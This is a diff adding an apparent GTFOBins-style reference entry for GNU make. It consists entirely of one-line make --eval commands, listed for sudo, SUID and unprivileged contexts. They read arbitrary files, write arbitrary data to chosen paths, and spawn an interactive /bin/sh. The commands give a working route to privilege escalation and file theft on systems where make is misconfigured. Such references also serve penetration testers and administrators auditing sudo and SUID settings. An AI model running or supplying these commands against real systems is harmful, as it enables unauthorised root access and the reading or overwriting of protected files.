@@ -1,0 +1,38 @@
+make
+====
+
+File read
+---------
+
+[Sudo]
+    make -s --eval='$(file >/dev/stdout,$(file </path/to/input-file))' .
+
+[SUID]
+    make -s --eval='$(file >/dev/stdout,$(file </path/to/input-file))' .
+
+[Unprivileged]
+    make -s --eval='$(file >/dev/stdout,$(file </path/to/input-file))' .
+
+File write
+----------
+
+[Sudo]
+    make -s --eval='$(file >/path/to/output-file,DATA)' .
+
+[SUID]
+    make -s --eval='$(file >/path/to/output-file,DATA)' .
+
+[Unprivileged]
+    make -s --eval='$(file >/path/to/output-file,DATA)' .
+
+Shell
+-----
+
+[Sudo]
+    make --eval='$(shell /bin/sh 1>&0)' .
+
+[SUID]
+    make --eval='$(shell /bin/sh 1>&0)' .
+
+[Unprivileged]
+    make --eval='$(shell /bin/sh 1>&0)' .
